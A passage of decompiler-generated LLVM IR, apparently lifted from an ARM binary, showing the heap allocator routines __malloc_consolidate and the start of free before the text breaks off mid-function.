  %v1_1291c = phi i32 [ %v1_1291c.pre, %dec_label_pc_128ec ], [ 0, %dec_label_pc_12910 ]
  store i32 %v12_12874, i32* @r7, align 4
  ret i32 %v1_1291c

; uselistorder directives
  uselistorder i1 %v7_128dc, { 1, 0 }
  uselistorder i32 %v1_128d8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1287c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12914, { 1, 0 }
  uselistorder label %dec_label_pc_12910, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12920 = load i32, i32* @r4, align 4
  store i32 %v3_12920, i32* %stack_var_-36, align 4
  %v0_12924 = load i32, i32* @r0, align 4
  %v1_12924 = inttoptr i32 %v0_12924 to i32*
  %v2_12924 = load i32, i32* %v1_12924, align 4
  store i32 %v2_12924, i32* %r3.global-to-local, align 4
  %v2_12928 = icmp eq i32 %v2_12924, 0
  store i32 %v0_12924, i32* @r4, align 4
  br i1 %v2_12928, label %dec_label_pc_12a60.preheader, label %dec_label_pc_1293c

dec_label_pc_12a60.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12a6825 = add i32 %v0_12924, 52
  store i32 %v1_12a6825, i32* %r3.global-to-local, align 4
  %v2_12a7026 = add i32 %v0_12924, 60
  %v3_12a7027 = inttoptr i32 %v2_12a7026 to i32*
  store i32 %v1_12a6825, i32* %v3_12a7027, align 4
  %v0_12a7428 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a7429 = add i32 %v0_12a7428, 12
  %v3_12a7430 = inttoptr i32 %v2_12a7429 to i32*
  store i32 %v0_12a7428, i32* %v3_12a7430, align 4
  br label %dec_label_pc_12a60.dec_label_pc_12a60_crit_edge

dec_label_pc_1293c:                               ; preds = %entry
  %v1_1293c = and i32 %v2_12924, -3
  %v3_12940 = udiv i32 %v2_12924, 8
  store i32 %v3_12940, i32* %r2.global-to-local, align 4
  store i32 %v1_1293c, i32* %v1_12924, align 4
  %v0_12948 = load i32, i32* @r0, align 4
  %v1_12948 = add i32 %v0_12948, -4
  store i32 %v1_12948, i32* %r3.global-to-local, align 4
  %v1_1294c = load i32, i32* %r2.global-to-local, align 4
  %v4_1294c = mul i32 %v1_1294c, 4
  %v5_1294c = add i32 %v4_1294c, %v1_12948
  store i32 %v5_1294c, i32* %sb.global-to-local, align 4
  %v1_12950 = add i32 %v0_12948, 52
  store i32 %v1_12950, i32* %r7.global-to-local, align 4
  %v1_12954 = add i32 %v0_12948, 4
  store i32 %v1_12954, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_12a58, %dec_label_pc_1293c
  %v1_12a5010 = phi i32 [ %v1_12a50, %dec_label_pc_12a58 ], [ %v5_1294c, %dec_label_pc_1293c ]
  %v1_12968 = phi i32 [ %v1_12a58, %dec_label_pc_12a58 ], [ %v1_12954, %dec_label_pc_1293c ]
  %v1_1295c = inttoptr i32 %v1_12968 to i32*
  %v2_1295c = load i32, i32* %v1_1295c, align 4
  store i32 %v2_1295c, i32* %r1.global-to-local, align 4
  %v2_12960 = icmp eq i32 %v2_1295c, 0
  br i1 %v2_12960, label %dec_label_pc_12a50, label %dec_label_pc_12968

dec_label_pc_12968:                               ; preds = %dec_label_pc_1295c
  %v0_12968 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12968, i32* %v1_1295c, align 4
  %v0_1296c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1296c

dec_label_pc_1296c:                               ; preds = %dec_label_pc_12a44, %dec_label_pc_12968
  %v0_12988 = phi i32 [ %v0_12a44, %dec_label_pc_12a44 ], [ %v0_1296c.pre, %dec_label_pc_12968 ]
  %v1_1296c = add i32 %v0_12988, 4
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  %v3_1296c = load i32, i32* %v2_1296c, align 4
  store i32 %v3_1296c, i32* %r3.global-to-local, align 4
  %v1_12970 = and i32 %v3_1296c, -2
  store i32 %v1_12970, i32* %lr.global-to-local, align 4
  %v2_12974 = add i32 %v1_12970, %v0_12988
  store i32 %v2_12974, i32* @r0, align 4
  %v1_12978 = urem i32 %v3_1296c, 2
  %v2_12978 = icmp eq i32 %v1_12978, 0
  %v1_1297c = add i32 %v0_12988, 8
  %v2_1297c = inttoptr i32 %v1_1297c to i32*
  %v3_1297c = load i32, i32* %v2_1297c, align 4
  store i32 %v3_1297c, i32* %sl.global-to-local, align 4
  %v1_12980 = add i32 %v2_12974, 4
  %v2_12980 = inttoptr i32 %v1_12980 to i32*
  %v3_12980 = load i32, i32* %v2_12980, align 4
  store i32 %v3_12980, i32* %r8.global-to-local, align 4
  br i1 %v2_12978, label %dec_label_pc_12988, label %dec_label_pc_129bc

dec_label_pc_12988:                               ; preds = %dec_label_pc_1296c
  %v1_12988 = inttoptr i32 %v0_12988 to i32*
  %v2_12988 = load i32, i32* %v1_12988, align 4
  store i32 %v2_12988, i32* %r5.global-to-local, align 4
  %v2_1298c = sub i32 %v0_12988, %v2_12988
  store i32 %v2_1298c, i32* %r3.global-to-local, align 4
  %v1_12990 = add i32 %v2_1298c, 8
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %ip.global-to-local, align 4
  %v1_12994 = add i32 %v3_12990, 12
  %v2_12994 = inttoptr i32 %v1_12994 to i32*
  %v3_12994 = load i32, i32* %v2_12994, align 4
  store i32 %v3_12994, i32* %r1.global-to-local, align 4
  %v9_12998 = icmp eq i32 %v3_12994, %v2_1298c
  %v1_1299c = add i32 %v2_1298c, 12
  %v2_1299c = inttoptr i32 %v1_1299c to i32*
  %v3_1299c = load i32, i32* %v2_1299c, align 4
  store i32 %v3_1299c, i32* %r2.global-to-local, align 4
  br i1 %v9_12998, label %dec_label_pc_129a4, label %dec_label_pc_12a00

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12988
  %v1_129a4 = add i32 %v3_1299c, 8
  %v2_129a4 = inttoptr i32 %v1_129a4 to i32*
  %v3_129a4 = load i32, i32* %v2_129a4, align 4
  store i32 %v3_129a4, i32* %r3.global-to-local, align 4
  %v9_129a8 = icmp eq i32 %v3_129a4, %v2_1298c
  br i1 %v9_129a8, label %dec_label_pc_129b0, label %dec_label_pc_12a00

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a4
  store i32 %v3_12990, i32* %v2_129a4, align 4
  %v0_129b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_129b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_129b4 = add i32 %v1_129b4, 12
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 %v0_129b4, i32* %v3_129b4, align 4
  %v0_129b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_129b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_129b8 = add i32 %v1_129b8, %v0_129b8
  store i32 %v2_129b8, i32* %lr.global-to-local, align 4
  %v0_129c0.pre = load i32, i32* @r0, align 4
  %v0_129c4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_1296c, %dec_label_pc_129b0
  %v0_12a34 = phi i32 [ %v1_12970, %dec_label_pc_1296c ], [ %v2_129b8, %dec_label_pc_129b0 ]
  %v0_129c4 = phi i32 [ %v3_12980, %dec_label_pc_1296c ], [ %v0_129c4.pre, %dec_label_pc_129b0 ]
  %v1_129d8 = phi i32 [ %v2_12974, %dec_label_pc_1296c ], [ %v0_129c0.pre, %dec_label_pc_129b0 ]
  %v0_129bc = load i32, i32* @r4, align 4
  %v1_129bc = add i32 %v0_129bc, 44
  %v2_129bc = inttoptr i32 %v1_129bc to i32*
  %v3_129bc = load i32, i32* %v2_129bc, align 4
  store i32 %v3_129bc, i32* %r3.global-to-local, align 4
  %v9_129c0 = icmp eq i32 %v1_129d8, %v3_129bc
  %v1_129c4 = and i32 %v0_129c4, -4
  store i32 %v1_129c4, i32* %r5.global-to-local, align 4
  br i1 %v9_129c0, label %dec_label_pc_12a34, label %dec_label_pc_129cc

dec_label_pc_129cc:                               ; preds = %dec_label_pc_129bc
  %v2_129cc = add i32 %v1_129d8, %v1_129c4
  store i32 %v2_129cc, i32* %r3.global-to-local, align 4
  %v1_129d0 = add i32 %v2_129cc, 4
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v3_129d0, i32* %r3.global-to-local, align 4
  %v1_129d4 = urem i32 %v3_129d0, 2
  %v2_129d4 = icmp eq i32 %v1_129d4, 0
  %v2_129d8 = add i32 %v1_129d8, 4
  %v3_129d8 = inttoptr i32 %v2_129d8 to i32*
  store i32 %v1_129c4, i32* %v3_129d8, align 4
  br i1 %v2_129d4, label %dec_label_pc_129e0, label %dec_label_pc_129cc.dec_label_pc_12a10_crit_edge

dec_label_pc_129cc.dec_label_pc_12a10_crit_edge:  ; preds = %dec_label_pc_129cc
  %v0_12a14.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12a10

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129cc
  %v0_129e0 = load i32, i32* @r0, align 4
  %v1_129e0 = add i32 %v0_129e0, 8
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  store i32 %v3_129e0, i32* %ip.global-to-local, align 4
  %v1_129e4 = add i32 %v3_129e0, 12
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r3.global-to-local, align 4
  %v9_129e8 = icmp eq i32 %v3_129e4, %v0_129e0
  %v1_129ec = add i32 %v0_129e0, 12
  %v2_129ec = inttoptr i32 %v1_129ec to i32*
  %v3_129ec = load i32, i32* %v2_129ec, align 4
  store i32 %v3_129ec, i32* %r2.global-to-local, align 4
  br i1 %v9_129e8, label %dec_label_pc_129f4, label %dec_label_pc_12a00

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129e0
  %v1_129f4 = add i32 %v3_129ec, 8
  %v2_129f4 = inttoptr i32 %v1_129f4 to i32*
  %v3_129f4 = load i32, i32* %v2_129f4, align 4
  store i32 %v3_129f4, i32* %r3.global-to-local, align 4
  %v9_129f8 = icmp eq i32 %v3_129f4, %v0_129e0
  br i1 %v9_129f8, label %dec_label_pc_12a04, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129e0, %dec_label_pc_129a4, %dec_label_pc_12988, %dec_label_pc_129f4
  %v0_12a00 = call i32 @abort()
  store i32 %v0_12a00, i32* @r0, align 4
  %v0_12a04.pre = load i32, i32* @ip, align 4
  %v1_12a04.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12a04

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129f4, %dec_label_pc_12a00
  %v1_12a04 = phi i32 [ %v3_129ec, %dec_label_pc_129f4 ], [ %v1_12a04.pre, %dec_label_pc_12a00 ]
  %v0_12a04 = phi i32 [ %v3_129e0, %dec_label_pc_129f4 ], [ %v0_12a04.pre, %dec_label_pc_12a00 ]
  %v2_12a04 = add i32 %v1_12a04, 8
  %v3_12a04 = inttoptr i32 %v2_12a04 to i32*
  store i32 %v0_12a04, i32* %v3_12a04, align 4
  %v0_12a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a08 = load i32, i32* %ip.global-to-local, align 4
  %v2_12a08 = add i32 %v1_12a08, 12
  %v3_12a08 = inttoptr i32 %v2_12a08 to i32*
  store i32 %v0_12a08, i32* %v3_12a08, align 4
  %v0_12a0c = load i32, i32* %lr.global-to-local, align 4
  %v1_12a0c = load i32, i32* %r5.global-to-local, align 4
  %v2_12a0c = add i32 %v1_12a0c, %v0_12a0c
  store i32 %v2_12a0c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_129cc.dec_label_pc_12a10_crit_edge, %dec_label_pc_12a04
  %v0_12a14 = phi i32 [ %v0_12a14.pre, %dec_label_pc_129cc.dec_label_pc_12a10_crit_edge ], [ %v2_12a0c, %dec_label_pc_12a04 ]
  %v0_12a10 = load i32, i32* %r7.global-to-local, align 4
  %v1_12a10 = add i32 %v0_12a10, 8
  %v2_12a10 = inttoptr i32 %v1_12a10 to i32*
  %v3_12a10 = load i32, i32* %v2_12a10, align 4
  store i32 %v3_12a10, i32* %r2.global-to-local, align 4
  %v1_12a14 = or i32 %v0_12a14, 1
  store i32 %v1_12a14, i32* %r3.global-to-local, align 4
  %v0_12a18 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12a18, i32* %v2_12a10, align 4
  %v0_12a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_12a1c = load i32, i32* %r2.global-to-local, align 4
  %v2_12a1c = add i32 %v1_12a1c, 12
  %v3_12a1c = inttoptr i32 %v2_12a1c to i32*
  store i32 %v0_12a1c, i32* %v3_12a1c, align 4
  %v0_12a20 = load i32, i32* %lr.global-to-local, align 4
  %v1_12a20 = load i32, i32* %r1.global-to-local, align 4
  %v3_12a20 = add i32 %v1_12a20, %v0_12a20
  %v4_12a20 = inttoptr i32 %v3_12a20 to i32*
  store i32 %v0_12a20, i32* %v4_12a20, align 4
  %v0_12a24 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a24 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a24 = add i32 %v1_12a24, 4
  %v3_12a24 = inttoptr i32 %v2_12a24 to i32*
  store i32 %v0_12a24, i32* %v3_12a24, align 4
  %v0_12a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a28 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a28 = add i32 %v1_12a28, 8
  %v3_12a28 = inttoptr i32 %v2_12a28 to i32*
  store i32 %v0_12a28, i32* %v3_12a28, align 4
  %v0_12a2c = load i32, i32* %r7.global-to-local, align 4
  %v1_12a2c = load i32, i32* %r1.global-to-local, align 4
  %v2_12a2c = add i32 %v1_12a2c, 12
  %v3_12a2c = inttoptr i32 %v2_12a2c to i32*
  store i32 %v0_12a2c, i32* %v3_12a2c, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a34:                               ; preds = %dec_label_pc_129bc
  %v2_12a34 = add i32 %v1_129c4, %v0_12a34
  %v1_12a38 = or i32 %v2_12a34, 1
  store i32 %v1_12a38, i32* %r3.global-to-local, align 4
  %v1_12a3c = load i32, i32* %r1.global-to-local, align 4
  %v2_12a3c = add i32 %v1_12a3c, 4
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v1_12a38, i32* %v3_12a3c, align 4
  %v0_12a40 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a40 = load i32, i32* @r4, align 4
  %v2_12a40 = add i32 %v1_12a40, 44
  %v3_12a40 = inttoptr i32 %v2_12a40 to i32*
  store i32 %v0_12a40, i32* %v3_12a40, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a10, %dec_label_pc_12a34
  %v0_12a44 = load i32, i32* %sl.global-to-local, align 4
  %v2_12a44 = icmp eq i32 %v0_12a44, 0
  store i32 %v0_12a44, i32* %r1.global-to-local, align 4
  br i1 %v2_12a44, label %dec_label_pc_12a50.loopexit, label %dec_label_pc_1296c

dec_label_pc_12a50.loopexit:                      ; preds = %dec_label_pc_12a44
  %v0_12a50.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12a50.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a50.loopexit, %dec_label_pc_1295c
  %v1_12a50 = phi i32 [ %v1_12a50.pre, %dec_label_pc_12a50.loopexit ], [ %v1_12a5010, %dec_label_pc_1295c ]
  %v0_12a58 = phi i32 [ %v0_12a50.pre, %dec_label_pc_12a50.loopexit ], [ %v1_12968, %dec_label_pc_1295c ]
  %v9_12a50 = icmp eq i32 %v0_12a58, %v1_12a50
  br i1 %v9_12a50, label %dec_label_pc_12ac8, label %dec_label_pc_12a58

dec_label_pc_12a58:                               ; preds = %dec_label_pc_12a50
  %v1_12a58 = add i32 %v0_12a58, 4
  store i32 %v1_12a58, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1295c

dec_label_pc_12a60.dec_label_pc_12a60_crit_edge:  ; preds = %dec_label_pc_12a60.preheader, %dec_label_pc_12a60.dec_label_pc_12a60_crit_edge
  %v0_12a60.pre = load i32, i32* @r4, align 4
  %v1_12a60.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12a60 = mul i32 %v1_12a60.pre, 8
  %v5_12a60 = add i32 %v4_12a60, %v0_12a60.pre
  %v1_12a64 = add i32 %v1_12a60.pre, 1
  store i32 %v1_12a64, i32* %r2.global-to-local, align 4
  %v1_12a68 = add i32 %v5_12a60, 44
  store i32 %v1_12a68, i32* %r3.global-to-local, align 4
  %v2_12a70 = add i32 %v5_12a60, 52
  %v3_12a70 = inttoptr i32 %v2_12a70 to i32*
  store i32 %v1_12a68, i32* %v3_12a70, align 4
  %v0_12a74 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a74 = add i32 %v0_12a74, 12
  %v3_12a74 = inttoptr i32 %v2_12a74 to i32*
  store i32 %v0_12a74, i32* %v3_12a74, align 4
  %v7_12a78 = icmp sgt i32 %v1_12a64, 95
  br i1 %v7_12a78, label %dec_label_pc_12a7c, label %dec_label_pc_12a60.dec_label_pc_12a60_crit_edge

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a60.dec_label_pc_12a60_crit_edge
  %v0_12a7c = load i32, i32* @r4, align 4
  %v1_12a7c = inttoptr i32 %v0_12a7c to i32*
  %v2_12a7c = load i32, i32* %v1_12a7c, align 4
  store i32 %v2_12a7c, i32* %r2.global-to-local, align 4
  %v1_12a80 = add i32 %v0_12a7c, 864
  %v2_12a80 = inttoptr i32 %v1_12a80 to i32*
  %v3_12a80 = load i32, i32* %v2_12a80, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12a88 = urem i32 %v2_12a7c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12a90 = or i32 %v3_12a80, 1
  store i32 %v1_12a90, i32* %r1.global-to-local, align 4
  %v1_12a94 = or i32 %v1_12a88, 72
  store i32 %v1_12a94, i32* %r2.global-to-local, align 4
  %v1_12a98 = add i32 %v0_12a7c, 52
  store i32 %v1_12a98, i32* %ip.global-to-local, align 4
  %v2_12a9c = add i32 %v0_12a7c, 840
  %v3_12a9c = inttoptr i32 %v2_12a9c to i32*
  store i32 0, i32* %v3_12a9c, align 4
  %v0_12aa0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12aa0 = add i32 %v0_12aa0, 65536
  store i32 %v1_12aa0, i32* %r3.global-to-local, align 4
  %v0_12aa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12aa4 = load i32, i32* @r4, align 4
  %v2_12aa4 = add i32 %v1_12aa4, 836
  %v3_12aa4 = inttoptr i32 %v2_12aa4 to i32*
  store i32 %v0_12aa4, i32* %v3_12aa4, align 4
  %v0_12aa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_12aa8 = load i32, i32* @r4, align 4
  %v2_12aa8 = add i32 %v1_12aa8, 844
  %v3_12aa8 = inttoptr i32 %v2_12aa8 to i32*
  store i32 %v0_12aa8, i32* %v3_12aa8, align 4
  %v1_12aac = load i32, i32* @r4, align 4
  %v2_12aac = add i32 %v1_12aac, 852
  %v3_12aac = inttoptr i32 %v2_12aac to i32*
  store i32 %v1_12aa0, i32* %v3_12aac, align 4
  %v1_12ab0 = load i32, i32* @r4, align 4
  %v2_12ab0 = add i32 %v1_12ab0, 864
  %v3_12ab0 = inttoptr i32 %v2_12ab0 to i32*
  store i32 %v1_12a90, i32* %v3_12ab0, align 4
  %v1_12ab4 = load i32, i32* @r4, align 4
  %v2_12ab4 = inttoptr i32 %v1_12ab4 to i32*
  store i32 %v1_12a94, i32* %v2_12ab4, align 4
  %v0_12ab8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ab8 = load i32, i32* @r4, align 4
  %v2_12ab8 = add i32 %v1_12ab8, 44
  %v3_12ab8 = inttoptr i32 %v2_12ab8 to i32*
  store i32 %v0_12ab8, i32* %v3_12ab8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12ac0 = call i32 @sysconf(i32 30, i32 %v1_12a90, i32 %v1_12a94, i32 %v1_12aa0)
  store i32 %v4_12ac0, i32* @r0, align 4
  %v1_12ac4 = load i32, i32* @r4, align 4
  %v2_12ac4 = add i32 %v1_12ac4, 860
  %v3_12ac4 = inttoptr i32 %v2_12ac4 to i32*
  store i32 %v4_12ac0, i32* %v3_12ac4, align 4
  br label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12a50, %dec_label_pc_12a7c
  %v2_12acc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12acc, i32* @r4, align 4
  %v1_12ad0 = load i32, i32* @r0, align 4
  ret i32 %v1_12ad0

; uselistorder directives
  uselistorder i32 %v0_12a7c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12a74, { 1, 0 }
  uselistorder i32 %v1_12a58, { 1, 0 }
  uselistorder i32 %v0_12a44, { 0, 2, 1 }
  uselistorder i32 %v0_12a20, { 1, 0 }
  uselistorder i32 %v1_12970, { 1, 0, 2 }
  uselistorder i32 %v0_12988, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12948, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 10, 0, 8, 9, 6, 7, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12ac8, { 1, 0 }
  uselistorder label %dec_label_pc_12a60.dec_label_pc_12a60_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12a44, { 1, 0 }
  uselistorder label %dec_label_pc_12a10, { 1, 0 }
  uselistorder label %dec_label_pc_12a04, { 1, 0 }
  uselistorder label %dec_label_pc_12a00, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_129bc, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12ad4 = load i32, i32* @r4, align 4
  %v6_12ad4 = load i32, i32* @r5, align 4
  %v9_12ad4 = load i32, i32* @r6, align 4
  %v12_12ad4 = load i32, i32* @r7, align 4
  %v18_12ad4 = load i32, i32* @lr, align 4
  %v0_12adc = load i32, i32* @r0, align 4
  store i32 %v0_12adc, i32* @r6, align 4
  %v2_12adc = icmp eq i32 %v0_12adc, 0
  %v2_12ae0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r7, align 4
  br i1 %v2_12adc, label %dec_label_pc_12ce8, label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12af0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 108) to i32*), align 4
  store i32 %v4_12af0, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12af0, i32* %r2.global-to-local, align 4
  %v4_12afc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), align 4
  store i32 %v4_12afc, i32* %r1.global-to-local, align 4
  store i32 %v2_12ae0, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12b08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  store i32 %v4_12b08, i32* %ip.global-to-local, align 4
  store i32 76564, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12b08)
  %v0_12b14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b14, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12b1c = load i32, i32* @r7, align 4
  %v2_12b1c = add i32 %v0_12b1c, 16
  %v3_12b1c = inttoptr i32 %v2_12b1c to i32*
  %v4_12b1c = load i32, i32* %v3_12b1c, align 4
  store i32 %v4_12b1c, i32* %ip.global-to-local, align 4
  store i32 76584, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12b1c)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12b2c = load i32, i32* @r7, align 4
  %v2_12b2c = add i32 %v0_12b2c, 64
  %v3_12b2c = inttoptr i32 %v2_12b2c to i32*
  %v4_12b2c = load i32, i32* %v3_12b2c, align 4
  store i32 %v4_12b2c, i32* @lr, align 4
  %v0_12b30 = load i32, i32* @r6, align 4
  %v1_12b30 = add i32 %v0_12b30, -4
  %v2_12b30 = inttoptr i32 %v1_12b30 to i32*
  %v3_12b30 = load i32, i32* %v2_12b30, align 4
  store i32 %v3_12b30, i32* %r2.global-to-local, align 4
  %v1_12b34 = inttoptr i32 %v4_12b2c to i32*
  %v2_12b34 = load i32, i32* %v1_12b34, align 4
  store i32 %v2_12b34, i32* %r3.global-to-local, align 4
  %v1_12b38 = and i32 %v3_12b30, -4
  store i32 %v1_12b38, i32* %ip.global-to-local, align 4
  %v1_12b3c = add i32 %v0_12b30, -8
  store i32 %v1_12b3c, i32* @r5, align 4
  store i32 %v1_12b3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12b38, %v2_12b34
  br i1 %tmp, label %dec_label_pc_12b6c, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12aec
  %v1_12b4c = or i32 %v2_12b34, 3
  store i32 %v1_12b4c, i32* %r3.global-to-local, align 4
  store i32 %v1_12b4c, i32* %v1_12b34, align 4
  %v3_12b50 = load i32, i32* @lr, align 4
  %v4_12b50 = add i32 %v3_12b50, -8
  store i32 %v4_12b50, i32* %lr.global-to-local, align 4
  %v0_12b54 = load i32, i32* %ip.global-to-local, align 4
  %v3_12b54 = udiv i32 %v0_12b54, 8
  store i32 %v3_12b54, i32* %r1.global-to-local, align 4
  %v1_12b58 = add i32 %v3_12b50, -4
  store i32 %v1_12b58, i32* %r2.global-to-local, align 4
  %v4_12b5c = mul nuw i32 %v3_12b54, 4
  %v5_12b5c = add i32 %v4_12b5c, %v1_12b58
  %v6_12b5c = inttoptr i32 %v5_12b5c to i32*
  %v7_12b5c = load i32, i32* %v6_12b5c, align 4
  store i32 %v7_12b5c, i32* %r3.global-to-local, align 4
  %v1_12b60 = load i32, i32* @r5, align 4
  %v2_12b60 = add i32 %v1_12b60, 8
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 %v7_12b5c, i32* %v3_12b60, align 4
  %v0_12b64 = load i32, i32* @r5, align 4
  %v1_12b64 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b64 = load i32, i32* %r1.global-to-local, align 4
  %v5_12b64 = mul i32 %v2_12b64, 4
  %v6_12b64 = add i32 %v5_12b64, %v1_12b64
  %v7_12b64 = inttoptr i32 %v6_12b64 to i32*
  store i32 %v0_12b64, i32* %v7_12b64, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12b6c:                               ; preds = %dec_label_pc_12aec
  %v1_12b6c = and i32 %v3_12b30, 2
  %v2_12b6c = icmp eq i32 %v1_12b6c, 0
  br i1 %v2_12b6c, label %dec_label_pc_12b74, label %dec_label_pc_12ca8

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12b6c
  %v1_12b74 = or i32 %v2_12b34, 1
  store i32 %v1_12b74, i32* %r3.global-to-local, align 4
  store i32 %v1_12b74, i32* %v1_12b34, align 4
  %v0_12b7c = load i32, i32* @r6, align 4
